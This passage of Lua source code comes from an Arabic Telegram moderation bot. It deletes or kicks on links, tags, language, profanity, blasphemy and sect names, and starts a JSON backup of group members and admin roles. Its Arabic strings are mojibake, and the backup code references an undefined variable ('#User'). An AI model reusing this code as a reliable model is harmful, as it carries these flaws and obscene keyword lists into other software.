send(msg.chat_id_,msg.id_,RioText)
end 
end   
end
end,nil)
end
if DevRio:get(Rinda..'Rio:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban(msg.content_.members_[0].id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and BanAll(msg.content_.members_[0].id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if DevRio:get(Rinda.."Rio:Lock:Welcome"..msg.chat_id_) then
if DevRio:get(Rinda..'Rio:Groups:Welcomes'..msg.chat_id_) then
Welcomes = DevRio:get(Rinda..'Rio:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = 'โข ููุฑุช ุญุจู \nโข firstname \nโข username'
end
local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
local Welcomes = Welcomes:gsub('firstname',('['..msg.content_.members_[0].first_name_..']' or ''))
local Welcomes = Welcomes:gsub('username',('[@'..msg.content_.members_[0].username_..']' or '[@Source_Rinda]'))
Dev_Rio(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--        Contact         --
elseif msg.content_.ID == "MessageContact" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevRio:get(Rinda..'Rio:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevRio:get(Rinda..'Rio:Lock:Contact'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--         Audio          --
elseif msg.content_.ID == "MessageAudio" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevRio:get(Rinda..'Rio:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevRio:get(Rinda..'Rio:Lock:Music'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevRio:get(Rinda..'Rio:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevRio:get(Rinda..'Rio:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevRio:get(Rinda..'Rio:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevRio:get(Rinda..'Rio:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevRio:get(Rinda..'Rio:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevRio:get(Rinda..'Rio:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--         Voice          --
elseif msg.content_.ID == "MessageVoice" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevRio:get(Rinda..'Rio:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevRio:get(Rinda..'Rio:Lock:Voice'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevRio:get(Rinda..'Rio:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevRio:get(Rinda..'Rio:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevRio:get(Rinda..'Rio:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevRio:get(Rinda..'Rio:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevRio:get(Rinda..'Rio:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevRio:get(Rinda..'Rio:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--        Location        --
elseif msg.content_.ID == "MessageLocation" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevRio:get(Rinda..'Rio:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevRio:get(Rinda..'Rio:Lock:Location'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevRio:get(Rinda..'Rio:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevRio:get(Rinda..'Rio:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevRio:get(Rinda..'Rio:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevRio:get(Rinda..'Rio:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevRio:get(Rinda..'Rio:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevRio:get(Rinda..'Rio:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--         Video          --
elseif msg.content_.ID == "MessageVideo" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevRio:get(Rinda..'Rio:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevRio:get(Rinda..'Rio:Lock:Videos'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevRio:get(Rinda..'Rio:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevRio:get(Rinda..'Rio:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevRio:get(Rinda..'Rio:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevRio:get(Rinda..'Rio:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevRio:get(Rinda..'Rio:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevRio:get(Rinda..'Rio:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--          Gif           --
elseif msg.content_.ID == "MessageAnimation" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevRio:get(Rinda..'Rio:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevRio:get(Rinda..'Rio:Lock:Gifs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevRio:get(Rinda..'Rio:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevRio:get(Rinda..'Rio:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevRio:get(Rinda..'Rio:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevRio:get(Rinda..'Rio:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevRio:get(Rinda..'Rio:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevRio:get(Rinda..'Rio:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--         Text           --
elseif msg.content_.ID == "MessageText" then
if not VipMem(msg) then
Filters(msg,text)
if msg.forward_info_ then
if DevRio:get(Rinda..'Rio:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
if DevRio:get(Rinda..'Rio:Lock:Links'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevRio:get(Rinda..'Rio:Lock:Text'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.text_:match("@") then
if DevRio:get(Rinda..'Rio:Lock:Tags'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("#") then
if DevRio:get(Rinda..'Rio:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match(".[Xx][Yy][Zz]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevRio:get(Rinda..'Rio:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("[\216-\219][\128-\191]") then
if DevRio:get(Rinda..'Rio:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_ then
local _nl, ctrl_chars = string.gsub(text, '%c', '')
local _nl, real_digits = string.gsub(text, '%d', '')
if not DevRio:get(Rinda..'Rio:Spam:Text'..msg.chat_id_) then
sens = 400
else
sens = tonumber(DevRio:get(Rinda..'Rio:Spam:Text'..msg.chat_id_))
end
if DevRio:get(Rinda..'Rio:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
if DevRio:get(Rinda..'Rio:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DevRio:get(Rinda.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) then
if text == "ุงูุบุงุก" then
send(msg.chat_id_,msg.id_,"โ๏ธฐุชู ุงูุบุงุก ุญูุธ ุงูุฑุงุจุท")       
DevRio:del(Rinda.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
return false
end
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
DevRio:set(Rinda.."Rio:Groups:Links"..msg.chat_id_,Link)
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุญูุธ ุงูุฑุงุจุท ุถูุนู', 1, 'md')
DevRio:del(Rinda.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
return false 
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
local msg = data.message_
text = msg.content_.text_
if text and Constructor(msg) then 
if DevRio:get('RindaTeam:'..Rinda.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^ุงูุบุงุก$") then 
DevRio:del('RindaTeam:'..Rinda..'id:user'..msg.chat_id_)  
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ุงูุงูุฑ', 1, 'md')
DevRio:del('RindaTeam:'..Rinda.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevRio:del('RindaTeam:'..Rinda.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevRio:get('RindaTeam:'..Rinda..'id:user'..msg.chat_id_)  
DevRio:incrby(Rinda..'Rio:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
Dev_Rio(msg.chat_id_, msg.id_,  1, "โ๏ธฐุชู ุงุถุงูุฉ "..numadded..' ุฑุณุงูู', 1, 'md')
DevRio:del('RindaTeam:'..Rinda..'id:user'..msg.chat_id_) 
end
end
if text and Constructor(msg) then 
if DevRio:get('RindaTeam:'..Rinda.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^ุงูุบุงุก$") then 
DevRio:del('RindaTeam:'..Rinda..'ids:user'..msg.chat_id_)  
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ุงูุงูุฑ', 1, 'md')
DevRio:del('RindaTeam:'..Rinda.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevRio:del('RindaTeam:'..Rinda.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevRio:get('RindaTeam:'..Rinda..'ids:user'..msg.chat_id_)  
DevRio:incrby(Rinda..'Rio:GamesNumber'..msg.chat_id_..iduserr,numadded)  
Dev_Rio(msg.chat_id_, msg.id_,  1, "โ๏ธฐุชู ุงุถุงูุฉ "..numadded..' ููุทู', 1, 'md')
DevRio:del('RindaTeam:'..Rinda..'ids:user'..msg.chat_id_)  
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and (text:match("ุทูุฒ") or text:match("ุฏูุณ") or text:match("ุงููุฌ") or text:match("ููุฌ") or text:match("ุฏููุณ") or text:match("ุนูุฑ") or text:match("ูุณุฎุชู") or text:match("ูุณูู") or text:match("ูุณุฑุจู") or text:match("ุจูุงุน") or text:match("ุงุจู ุงูุนููุฑู") or text:match("ููููุฌ") or text:match("ูุญุจู") or text:match("ูุญุงุจ") or text:match("ุงููุญุจู") or text:match("ูุณู") or text:match("ุทูุฒู") or text:match("ูุณ ุงูู") or text:match("ุตุฑู") or text:match("ูุณ ุงุฎุชู")) then
if not DevRio:get(Rinda.."Rio:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","โ๏ธฐููููุน ุงููุดุงุฑ ูู ุงููุฌููุนู")  
end end
if text and (text:match("ฺฌ") or text:match("ูบ") or text:match("ฺ") or text:match("ฺ") or text:match("ฺฟ") or text:match("ฺ") or text:match("ฺ") or text:match("?ซ") or text:match("ฺ") or text:match("ฺ") or text:match("?") or text:match("ฺธ") or text:match("ูพ") or text:match("?ด") or text:match("ูฺฉ") or text:match("ุฒุฏู") or text:match("ุฏุฎุชุฑุง") or text:match("ุฏ?ูุซ") or text:match("ฺฉู?ูพุดู") or text:match("ุฎูุดุดูู") or text:match("ู?ุฏุง") or text:match("ฺฉู") or text:match("ุจุฏุงู?ู") or text:match("ุจุง?ุฏ") or text:match("ุฒูุงุดู??") or text:match("ุขููุฒุด") or text:match("ุฑุงุญุช?") or text:match("ุฎุณุชู") or text:match("ุจ?ุงู") or text:match("ุจูพูุดู") or text:match("ูุฑูู")) then
if DevRio:get(Rinda.."Rio:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","โ๏ธฐููููุน ุงูุชููู ุจุงูุบู ุงููุงุฑุณูู ููุง")  
end end
if text and (text:match("ฺฌ") or text:match("ูบ") or text:match("ฺ") or text:match("ฺ") or text:match("ฺฟ") or text:match("ฺ") or text:match("ฺ") or text:match("?ซ") or text:match("ฺ") or text:match("ฺ") or text:match("?") or text:match("ฺธ") or text:match("ูพ") or text:match("?ด") or text:match("ูฺฉ") or text:match("ุฒุฏู") or text:match("ุฏุฎุชุฑุง") or text:match("ุฏ?ูุซ") or text:match("ฺฉู?ูพุดู") or text:match("ุฎูุดุดูู") or text:match("ู?ุฏุง") or text:match("ฺฉู") or text:match("ุจุฏุงู?ู") or text:match("ุจุง?ุฏ") or text:match("ุฒูุงุดู??") or text:match("ุขููุฒุด") or text:match("ุฑุงุญุช?") or text:match("ุฎุณุชู") or text:match("ุจ?ุงู") or text:match("ุจูพูุดู") or text:match("ูุฑูู")) then
if DevRio:get(Rinda.."Rio:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ChatKick(msg.chat_id_, msg.sender_user_id_)
end end 
if text and (text:match("ุฎุฑู ุจุงููู") or text:match("ุฎุจุฑุจู") or text:match("ูุณุฏููุฑุจู") or text:match("ุฎุฑุจ ุจุงููู") or text:match("ุฎุฑุจ ุงููู") or text:match("ุฎุฑู ุจุฑุจู") or text:match("ุงููู ุงูููุงุฏ") or text:match("ุฎุฑู ุจูุญูุฏ") or text:match("ูุณู ุงููู") or text:match("ูุณู ุฑุจู") or text:match("ูุณุฑุจู") or text:match("ูุณุฎุชุงููู") or text:match("ูุณุฎุช ุงููู") or text:match("ุฎุฑู ุจุฏููู") or text:match("ุฎุฑูุจุฏููู") or text:match("ูุณุงููู") or text:match("ุฎุฑุจุงููู")) then
if not DevRio:get(Rinda.."Rio:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","โ๏ธฐููููุน ุงูููุฑ ูู ุงููุฌููุนู") 
end end
if text and (text:match("ุณูู ููุณ") or text:match("ุดูุนู") or text:match("ุงูุดูุนู") or text:match("ุงูุณูู") or text:match("ุทุงุฆูุชูู") or text:match("ุดูุนู") or text:match("ุงูุง ุณูู") or text:match("ูุณูุญู") or text:match("ูููุฏู") or text:match("ุตุงุจุฆู") or text:match("ููุญุฏ") or text:match("ุจุงูุณูู") or text:match("ุดูุนุฉ")) then
if not DevRio:get(Rinda.."Rio:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","โ๏ธฐููููุน ุงูุชููู ุจุงูุทุงุฆููู ููุง") 
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if SecondSudo(msg) then
if text == 'ุฌูุจ ูุณุฎู ุงููุฑูุจุงุช' and ChCheck(msg) or text == 'ุฌูุจ ูุณุฎู ุงุญุชูุงุทูู' and ChCheck(msg) or text == 'ุฌูุจ ุงููุณุฎู ุงูุงุญุชูุงุทูู' and ChCheck(msg) or text == 'โข ุฌูุจ ูุณุฎู ุงุญุชูุงุทูู โ' and ChCheck(msg) then
local List = DevRio:smembers(Rinda..'Rio:Groups') 
local Users = DevRio:smembers(Rinda..'Rio:Users') 
local BotName = (DevRio:get(Rinda.."Rio:NameBot") or 'ุฑููุฏุง')
local GetJson = '{"BotId": '..Rinda..',"BotName": "'..BotName..'","GroupsList":{'  
for k,v in pairs(List) do 
LinkGroups = DevRio:get(Rinda.."Rio:Groups:Links"..v)
Welcomes = DevRio:get(Rinda..'Rio:Groups:Welcomes'..v) or ''
Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
RioConstructors = DevRio:smembers(Rinda..'Rio:RioConstructor:'..v)
Constructors = DevRio:smembers(Rinda..'Rio:BasicConstructor:'..v)
BasicConstructors = DevRio:smembers(Rinda..'Rio:Constructor:'..v)
Managers = DevRio:smembers(Rinda..'Rio:Managers:'..v)
Admis = DevRio:smembers(Rinda..'Rio:Admins:'..v)
Vips = DevRio:smembers(Rinda..'Rio:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
end
if #User ~= 0 then 
GetJson = GetJson..'"Users":['
for k,v in pairs(Users) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Vips ~= 0 then 
GetJson = GetJson..'"Vips":['
for k,v in pairs(Vips) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Admis ~= 0 then
GetJson = GetJson..'"Admis":['
for k,v in pairs(Admis) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Managers ~= 0 then
GetJson = GetJson..'"Managers":['
for k,v in pairs(Managers) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Constructors ~= 0 then
GetJson = GetJson..'"Constructors":['
for k,v in pairs(Constructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #BasicConstructors ~= 0 then
GetJson = GetJson..'"BasicConstructors":['
